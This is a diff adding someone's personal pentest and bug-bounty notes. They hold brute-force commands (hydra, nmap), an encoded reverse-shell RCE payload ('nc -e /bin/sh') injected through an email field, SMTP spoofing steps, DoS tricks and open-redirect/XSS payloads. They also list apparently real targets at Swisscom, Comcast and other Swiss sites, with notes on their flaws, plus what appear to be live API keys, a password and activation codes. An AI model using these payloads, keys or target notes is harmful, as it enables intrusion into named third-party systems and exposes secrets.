+    mount -t nfs <server ip>:/home/ali /mnt/home/ali -o nolock
+    ------------------------------------------
+    9091 or 8086 => influxDB
+    example.com/debug/requests 
+    /debug/pprof/all
+    /debug/vars
+    -------------------------------------------
+    3306 then run 
+    use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+    -------------------------------------------
+    nmap -p27017 --script mongodb-brute <ip> 
+    nmap -p 27017 --script mongodb-databases <ip>
+    nmap -p22 --script=ssh-run --script-args="ssh-run.cmd=ls -l /,ssh-run,username=root,ssh-run.password=admin123" <ip>
+    --------------------------------------------
+    79 finger => # nc <ip> 79     -> then type root
+    cat users.txt | parallel -j 5 finger {}@ip    => to fingerprint found users 
+    ---------------------------------------------
+    pop3 brute force 
+    hydra -L users.txt -P wordlists.txt pop3://ip
+    ---------------------------------------------
+    2049 nfs and rsync 
+    rsync rsync://<ip>    => then rsync://<ip>/folder_found => downloaded in local 
+    showmount -e <ip>
+    mount <ip>:/folder_found /mnt/folder 
+    ls -lah /mnt/folder
+    
+    ---------------------------------------------
+    hydra -l root -P passes.txt telnet://192.174.1.1  => to brute force ftp
+    ---------------------------------------------
+    victim%40site.com%09-be%09${run{"/bin/nc%09-e%09/bin/sh%09192.168.1.2%0980"}}%09	=> rce via email update
+    https://github.com/linuxadi/40k-nuclei-templates
+    https://lnkd.in/dJ5scrDp
+    https://iscan.today/
+    ----------------------------------------------
+    ----------------------------------------------
+    If you ask how to find hash of the favicon, i will show you
+    1. find sample web containing Swagger with dork:
+    intext:"Swagger UI" intitle:"Swagger UI" site:id
+    2. after that, open up one only
+    3. view source and search down: "favicon"
+    4. ctrl+right click to open in new window
+    5. copy the URL and paste in https://lnkd.in/g-mGdxsc to get HASH of the icon
+    6. the hash of icon is shown in [favicon_hash]
+    7. copy the hash to shodan with query:
+    http.favicon.hash:-1839822816 country:"ID"
+    ------------------------------------------------
+    if 25 is open see what service and try to exploit it for social engineering
+    if 389 ldap then try 
+    python3
+    >>> import ldap3
+    >>> server = ldap3.Server('46.38.239.144',get_info=ldap3.ALL,port=389,use_ssl=False)
+    >>> connection = ldap3.Connection(server)
+    >>> connection.bind() 
+    see this [medium](https://medium.com/@maxcyber882/how-i-hacked-nasa-ldap-server-b7cbb8cd0eee)
+    >> server.info
+    >>connection.entries
+    -----------------------------------------------------------
+    if 25 smtp Is open 
+    # telnet <ip> 25
+    HELO X
+    MAIL FROM:<admin_bugbounty@company.com>
+    RCPT TO:<hackerthe250@gmail.com>
+    DATA
+    Subject: Test Email
+    From: admin_bugbounty@company.com
+    To: hackerthe250@gmail.com
+    This is test email 
+    .
+    QUIT
+    => you must recive email from the company 
+    
+    ```
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/702b56d5-cf54-4b28-ab29-69ef92d9c035/487ebc11-8c88-4db9-924a-106071fda86b/Untitled.png)
+    
+- **DOS**
+    
+    ```json
+    - upload large files
+    - upload high resolution image
+    - Random urls may make system crash
+    - inject large data in inputs 
+    - inject malicious chars like %00 
+    - Adding unsupported langauge in inputs 
+    - in messages try to add emojies and encode them 10000 for example 
+    ```
+    
+- **Android Apk**
+    
+    ```json
+    Decompile/Decompress/ReverseEngineering
+    1-ApkTool https://ibotpeaches.github.io/apktool/
+    2-jadx jui https://github.com/skylot/jadx
+    3-online decomplier https://www.decompiler.com
+    https://github.com/MobSF/Mobile-Security-Framework-MobSF
+    => jadex => online decompile 
+    1- Source code review 
+    	- resources/assets/src
+    	- classes.dex or smali/
+    	- useful files res/values/strings.xml 
+      -search for origin ip :  ((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)
+      -api_key
+    ```
+    
+- **Source Code Review**
+    
+    ```jsx
+    to decompile .NET files use 
+    1- Jet Brains dotpeek
+    2- ILSpy
+    3- devskim 
+    
+    ```
+    
+- **Errors and Fix SSL**
+    
+    ```jsx
+    when trying to access firefox https://ip found ( reset page ) for insure connection
+    open firefox and about:config => search for security.tls.version.min and set to 1
+    
+    ```
+    
+
+```json
+https://obsidian.md/download   => same as notion but locally
+https://book.martiandefense.llc/notes/security-research/bug-bounty
+latest exploit for vulnerablities 
+https://lnkd.in/ek7EcppD
+https://lnkd.in/eweVApaV
+https://dev.to/t/vulnerabilities
+
+https://www.driven.ca/policies/security => good program
+
+https://github.com/lothos612/shodan => shodan dorks
+
+© Swisscom Digital Technology SA 2024
+https://www.owt.swiss//json/cases.json
+https://networktest.glia.com/
+https://sdk-docs.glia.com/visitor-js-api/current/
+https://www.glia.com/
+https://qa.beta.glia.com/
+https://intelliflo.app.glia.eu
+https://falcon.glia.com/
+https://docs.glia.com/
+https://cms-hth.myoas.com/cgi-bin/printenv
+https://aws-marketplace.glia.com/
+https://capitalone.glia.com/
+
+https://cameraservice-qa-cvr-aws-eu1.sys.comcast.net/swagger-ui.html
+https://cameraservice-beta-cvr-aws-eu1.sys.comcast.net/swagger-ui.html
+https://cameraservice-cvr-aws-eu1.sys.comcast.net//swagger-ui.html
+https://cops-alarm-nj-rest.cms.xfinityhome.com//swagger/index.html
+https://cops-prov-nj-rest.cms.xfinityhome.com//swagger/index.html
+https://cops-alarm-tx-rest.cms.xfinityhome.com//api/swagger/index.html
+https://cops-prov-tx-rest.cms.xfinityhome.com//swagger/index.html
+
+jila.com
+-------------
+www.digital.deals
+thepiratebay.digital.deals
+Servicedesk.digital.deals
+--------------
+xxx.bluenews.ch
+https://app.localclubs.ch/soap/FUZZ 
+https://api.lyra-836.appcloud.swisscom.com/swagger.json
+https://api.lyra-836.appcloud.swisscom.com/v3
+https://api.lyra-836.appcloud.swisscom.com/info
+https://aka.swisscomstream.ch/meet/
+https://aka.swisscomstream.ch/test/FUZZ 
+https://auth.staging.local.ch/activate_account?code=fe6ed333-5abe-418e-af94-95b9a40a5dd6&locale=en&redirect_uri=https://hossamshady.me
+https://auth.staging.local.ch/activate_account?code=9457a6ce-1c25-4e61-ac25-e5e9c7ea178d&locale=en&redirect_uri=javascript:alert()
+DLry56wL7!u*Q=Z
+site:khealth.com -www -anthem  -help -app  -eligibility -careers -care -kaccount -auth -help
+https://lab.colabra.ai/auth/register?email=&redirect_to=https%3A%2F%2Fwww.google.com
+
+https://webmail.bluewin.ch/login.php?pageName=xxxx
+
+https://clients.i-web.ch/gemweb/welcome.php?GLOBALS=xxx
+https://www.medicalconnector.ch/list/mc.php?sec=j27k2-k3gh8&l=de&tab=2
+https://emergency.swisscom-alarm.ch/in_remote_feedback.php?log_user=user&log_epass=epass&akey=1234567890123456789012
+https://emergency.swisscom-alarm.ch/webin.php?log_user=user&log_epass=epass
+https://eshop.pwlan.ch/eShopNew/index.php
+https://d.sbcdc.ch/videoinsider/index.php?lang=fr&passwort=xxxx
+https://www.fahrlehrervergleich.ch/bewertungen.php?irat=18869
+https://www.fahrlehrervergleich.ch/fahrberatung.php
+https://www.fahrlehrervergleich.ch/nothelferkurse.php
+https://www.fahrlehrervergleich.ch/info.php
+https://www.fahrlehrervergleich.ch/stva.php
+https://www.fahrlehrervergleich.ch/wab.php
+https://www.fahrlehrervergleich.ch/motorrad_roller_fuehrerschein.php
+https://www.fahrlehrervergleich.ch/ranking_info.php
+https://www.fahrlehrervergleich.ch/verkehrskunde.php
+https://www.fahrlehrervergleich.ch/nothelfer.php
+https://www.fahrlehrervergleich.ch/ausweis.php
+https://www.fahrlehrervergleich.ch/motorradgrundkurs.php
+https://www.fahrlehrervergleich.ch/motorrad_fahren_lernen.php
+
+https://www.fahrlehrervergleich.ch/verkehrskundekurse.php
+
+https://www.fahrlehrervergleich.ch/registrierung.php
+https://www.fahrlehrervergleich.ch/registrierung.php
+https://fiberdoc.cablex.ch/fibercloud/registration.php => registeration 
+filetype:php  site:*.worklink.ch
+
+etv.ch
+wingo.ch
+swisscom.com
+swisscom.ch
+ajila.com
+mycalabex.ch
+search.ch
+zoon.ch
+renovero.ch
+digital.deals
+teleclub.ch
+teleclubsport.ch
+daura.ch
+mycloud.ch
+swisscom.ai
+pwlan.ch
+labnet.ch
+hcard.ch
+ellb.ch
+idisign.ch
+volvo-online.ch
+
+ajila.com =>  Expires on 2024-05-06
+digital.deals => for sale 	https://whois.domaintools.com/digital.deals
+kit.ag		 Expires on 2025-01-16
+kitag.com		 Expires on 2025-01-31
+jls.digital	 Expires on 2024-10-10
+conextrade.com	 Expires on 2024-04-20
+idisign.ch	idisign.ch is for sale!	https://whois.domaintools.com/idisign.ch
+intswisscom.com	 Expires on 2024-04-24
+ip-plus.net	 Expires on 2024-08-18
+paybillag.com	 Expires on 2024-10-18
+swisscloud.io	 Expires on 2024-11-03	
+swisscom-sharespace.com	 Expires on 2024-05-09
+swisscom-tv.com	 Expires on 2024-11-14
+swisscomcloud.com	 Expires on 2025-01-12
+swisscom.com	 Expires on 2024-08-19
+swisstrustroom.com	 Expires on 2024-12-16
+webtiser.com	 Expires on 2025-02-05
+openwt.com	 Expires on 2024-10-11
+openwt.io		 Expires on 2024-04-12
+openwt.net	 Expires on 2024-12-07
+fenster-türe-vergleich.ch		=> Available
+localsearch.tech	 Expires on 2024-09-04
+mycommerce.shop	 Expires on 2024-12-07
+scdag.net		 Expires on 2025-02-22
+
+telnet ssh.lyra-836.appcloud.swisscom.com 2222
+https://api.lyra-836.appcloud.swisscom.com/
+
+https://smart-flow-api-preprod.scapp.swisscom.com/swagger/index.html
+https://miss-backend-api-preprod.scapp.swisscom.com/swagger/index.html
+https://messagingproxy.swisscom.ch:4300/rest/swagger/index.html
+https://dealer.volvo-online.ch/api/
+https://dealer.volvo-online.ch/api/?xml
+
+  
+  011d7a40-fb18-11ee-b1c9-594c7f9d50a6		=> breachdirectory.org
+  4950feb3-1595-4812-93a2-929ad6216389		=> intelx
+  3a014750d56fe2e7bc5adf89e7229ad1		=> leak-lookup
+  a657e05ee29b3494de10405b94a1df876d4b29c2	=> hunter.io
+  
+  
+  
+  
+  ins1.s3.dev.swissom.com => no suchbucket
+  acc.rave.risk.nnip.com
+  
+  
+  register wordpress and idor 
+  https://forum.rapidscada.org/wp-login.php?action=register
+  
+  
+  
+  
+  Passive Traffic Sniffing
+Cross-Site Scripting (XSS)
+Browser history or log-diving
+Read access to a database containing session information
+
+jobs.ajila.com
+www.ajila.com
+-------------
+www.digital.deals
+thepiratebay.digital.deals
+Servicedesk.digital.deals
+--------------
+xxx.bluenews.ch
+https://app.localclubs.ch/soap/FUZZ 
+https://api.lyra-836.appcloud.swisscom.com/swagger.json
+
+https://api.lyra-836.appcloud.swisscom.com/info
+https://aka.swisscomstream.ch/meet/
+https://aka.swisscomstream.ch/test/FUZZ 
+https://auth.staging.local.ch/activate_account?code=fe6ed333-5abe-418e-af94-95b9a40a5dd6&locale=en&redirect_uri=https://hossamshady.me
+https://auth.staging.local.ch/activate_account?code=9457a6ce-1c25-4e61-ac25-e5e9c7ea178d&locale=en&redirect_uri=javascript:alert()
+DLry56wL7!u*Q=Z
+site:khealth.com -www -anthem  -help -app  -eligibility -careers -care -kaccount -auth -help
+https://lab.colabra.ai/auth/register?email=&redirect_to=https%3A%2F%2Fwww.google.com
+
+https://webmail.bluewin.ch/login.php?pageName=xxxx
+
+https://clients.i-web.ch/gemweb/welcome.php?GLOBALS=xxx
+https://www.medicalconnector.ch/list/mc.php?sec=j27k2-k3gh8&l=de&tab=2
+https://emergency.swisscom-alarm.ch/in_remote_feedback.php?log_user=user&log_epass=epass&akey=1234567890123456789012
+https://emergency.swisscom-alarm.ch/webin.php?log_user=user&log_epass=epass
+https://eshop.pwlan.ch/eShopNew/index.php
+
+Host: www.localreservation.ch rate limit is not present over admin panel 
+https://www.localreservation.ch/CMS/S5/--login/403?set_creator_backend_language=en
+
+https://app.localclubs.ch/_onRiLiBjCT1Fr3aouOA4/billing/cashAccounts/674f8112273ab755354a35db/importTransactions 
+file upload 
+
+https://app.localclubs.ch/   xss via profile image upload svg 
+
+https://app.localclubs.ch/ confirmation bypass after updating the email =? 
+1- hacker updates email to hacker@gmail.com  don't click on the link 
+2- hacker updates email to victim@gmail.com 
+3- hacker clicks on link step 1 and observe the victim@gmail.com was verified not hacker , Confirmation bypass 
+```
